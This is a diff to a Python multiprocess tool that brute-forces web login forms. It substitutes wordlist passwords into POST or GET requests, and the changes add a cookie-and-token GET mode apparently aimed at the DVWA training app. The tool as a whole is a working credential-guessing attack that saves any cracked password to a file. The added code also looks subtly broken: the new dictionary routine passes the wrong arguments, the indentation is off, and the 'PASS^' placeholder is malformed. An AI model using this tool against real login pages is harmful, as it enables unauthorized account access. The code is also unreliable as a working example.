@@ -17,6 +17,7 @@ import shutil  # copy file
 import subprocess
 from multiprocessing import Process, BoundedSemaphore, Queue, current_process, cpu_count
 
+
 class Thuan_01():
     def __init__(self):
         self.start_time = time.monotonic()
@@ -133,7 +134,12 @@ class Thuan_01():
             # temp_file = self.create_temporary_copy(compress_file, passwords_list[1])
             for word in passwords_list:
                 password = word.strip('\r').strip('\n')
-                data1 = {"chkSubmit": "ok", "txtLoginId": username, "txtPassword": password, "txtSel": 1}
+                u = '"' + username + '"'
+                p = '"' + password + '"'
+                data0 = data.replace("^USER^", u)
+                data00 = data0.replace("PASS^", p)
+                data1 = json.loads(data00)
+                # data1 = {"chkSubmit": "ok", "txtLoginId": username, "txtPassword": password, "txtSel": 1}
                 r = requests.post(link, data=data1)
                 stop = self.stop.get()
                 self.stop.put(stop)
@@ -152,7 +158,7 @@ class Thuan_01():
                         # correctpwd = True
                         # print(f"Correct password {passwd}!\n")
                         with open("correct_pass.txt", "w") as f:
-                        	f.write(password)
+                            f.write(password)
                         break
 
                 else:
@@ -172,13 +178,65 @@ class Thuan_01():
         except KeyboardInterrupt:
             self.process_lock.release()
 
+    def search_for_pass_dvwa(self, passwords_list, username, link, token, data, cookie, fail, max_words):
+        try:
+            # temp_file = self.create_temporary_copy(compress_file, passwords_list[1])
+            for word in passwords_list:
+                password = word.strip('\r').strip('\n')
+                data0 = data.replace("^USER^", username)
+                data00 = data0.replace("PASS^", password)
+                data1 = link + data00
+                cookie1 = json.loads(cookie)
+                # data1 = {"chkSubmit": "ok", "txtLoginId": username, "txtPassword": password, "txtSel": 1}
+                if len(token) > 1:
+                    data11 = data1 + token
+                    r = requests.get(data11, cookies=cookie1)
+                else:
+                    r = requests.get(data1, cookies=cookie1)
+                    stop = self.stop.get()
+                    self.stop.put(stop)
+                    if stop is False:  # if find password dont doing more is false
+                        self.counter(max_words)
+                        if fail in r.text:
+                            with open("tries.txt", "a") as f:
+                                f.write(f"{password}\n")
+                                f.close()
+                            # print(f"Incorrect password {passwd}\n")
+                        else:
+                            self.stop.get()
+                            self.stop.put(True)
+                            time.sleep(3)
+                            print("\n\t" + self.green("[+] Password Found: " + password + '\n'))
+                            # correctpwd = True
+                            # print(f"Correct password {passwd}!\n")
+                            with open("correct_pass.txt", "w") as f:
+                                f.write(password)
+                            break
+
+                    else:
+                        break
+                    # if os.path.isfile(temp_file):
+                    # os.remove(os.path.abspath(temp_file))
+                    # last_process_number = int(max_words / 500) + (max_words % 500 > 0)
+            if str(self.last_process_number) in str(current_process().name):
+                time.sleep(20)
+                stop = self.stop.get()
+                self.stop.put(stop)
+                if stop is False:
+                    print("\n\t" + self.red("[-] password not found") + "\n")
+                else:
+                    pass
+            self.process_lock.release()
+        except KeyboardInterrupt:
+            self.process_lock.release()
+
     def last_words_check(self, max_words, passwords_list, username, link, data, fail):
         while True:
             if self.stop is True:
                 exit(0)
             elif self.count == len(passwords_list):  # self_cont kam mishe
                 if self.file_type is "rar":
-                    self.search_for_pass(passwords_list,username, link, data, fail, max_words)
+                    self.search_for_pass(passwords_list, username, link, data, fail, max_words)
                 if self.stop is False:
                     print("\n\t" + self.red("[-] Password not found") + "\n")
                     self.delete_temporary_directory()
@@ -209,7 +267,44 @@ class Thuan_01():
                     stop = self.stop.get()
                     self.stop.put(stop)
                     if stop is False:  # ok finishing all process after finding password
-                        t = Process(target=self.search_for_pass, args=(passwords,username, link, data, fail, possible_words))
+                        t = Process(target=self.search_for_pass,
+                                    args=(passwords, username, link, data, fail, possible_words))
+                        self.threads.append(t)
+                        self.process_count += 1
+                        t.start()
+                    else:
+                        self.process_lock.release()
+                else:
+                    continue
+            for x in self.threads:
+                x.join()
+            self.delete_temporary_directory()
+            self.end_time()
+
+    def dict_guess_password_dvwa(self, dict_file, username, link, token, data, cookie, fail):
+        last_check = 0
+        passwords_group = []
+        possible_words = self.count_word(dict_file)
+        self.last_process_number = int(possible_words / self.shot) + (possible_words % self.shot > 0)
+        self.count.put(possible_words)
+        # self.file_type = self.detect_file_type(file)
+        self.fun("Starting password cracking " + link)
+        print(
+            "\n " + self.blue("[*]") + self.white(" Count of possible passwords: ") + self.bwhite(str(possible_words)))
+        with open(dict_file, "r") as wordlist:
+            for word in wordlist:
+                passwords_group.append(word)
+                last_check += 1
+                self.handling_too_many_open_files_error()
+                if (len(passwords_group) == self.shot) or (possible_words - last_check == 0):
+                    passwords = passwords_group
+                    passwords_group = []
+                    self.process_lock.acquire()
+                    stop = self.stop.get()
+                    self.stop.put(stop)
+                    if stop is False:  # ok finishing all process after finding password
+                        t = Process(target=self.search_for_pass,
+                                    args=(passwords, username, link, token, data, cookie, fail, possible_words))
                         self.threads.append(t)
                         self.process_count += 1
                         t.start()
@@ -244,7 +339,8 @@ class Thuan_01():
                     stop = self.stop.get()
                     self.stop.put(stop)
                     if stop is False:  # ok finishing all process after finding password
-                        t = Process(target=self.search_for_pass, args=(passwords,username, link, data, fail, possible_com))
+                        t = Process(target=self.search_for_pass,
+                                    args=(passwords, username, link, data, fail, possible_com))
                         self.threads.append(t)
                         self.process_count += 1
                         t.start()
@@ -326,13 +422,18 @@ class Thuan_01():
         parser.add_option("-e", dest="data", type='string', help="Specifies the data")
         parser.add_option("-f", dest="fail", type='string', help="Specifies the fault")
         parser.add_option("-u", dest="username", type='string', help="Specifies the username")
+        parser.add_option("-g", dest="get", type='string', help="Specifies the get method")
+        parser.add_option("-p", dest="post", type='string', help="Specifies the post method")
+        parser.add_option("-c", dest="cookie", type='string', help="Specifies the cookies")
+        parser.add_option("-s", dest="success", type='string', help="Specifies the success")
+        parser.add_option("-t", dest="token", type='string', help="Specifies the user token")
         parser.add_option("-b", dest="chartype", type='string', help="Specifies the character type")
         parser.add_option("-m", dest="minlength", type='string', help="Specifies minimum length of password")
         parser.add_option("-x", dest="maxlength", type='string', help="Specifies maximum length of password")
 
         (options, args) = parser.parse_args()
         try:
-            if options.link:
+            if options.post:
                 # link = os.path.abspath(options.file)
                 if options.dictfile:
                     if os.path.isfile(options.dictfile):
@@ -364,6 +465,17 @@ class Thuan_01():
                 else:
                     parser.error(" Choose a wordlist or bruteforce method, Use --help for more info")
                     exit(0)
+            elif options.get:
+                if options.dictfile:
+                    if os.path.isfile(options.dictfile):
+                        dictfile = os.path.abspath(options.dictfile)
+                        print(self.blue("Start time ==> ") + self.white(start_time_show) + "\n")
+                        self.dict_guess_password_dvwa(dictfile, options.username, options.link, options.token,
+                                                      options.data, options.cookie, options.fail)
+                    else:
+                        parser.error(" " + options.dictfile + " dictionary file does not exist")
+                        exit(0)
+
             else:
                 parser.error(" Choose a link, Use --help for more info")
                 exit(0)
@@ -375,7 +487,7 @@ class Thuan_01():
             # self.end_time()
             exit(0)
 
-            
+
 if __name__ == "__main__":
     cracker = Thuan_01()
     cracker.main()
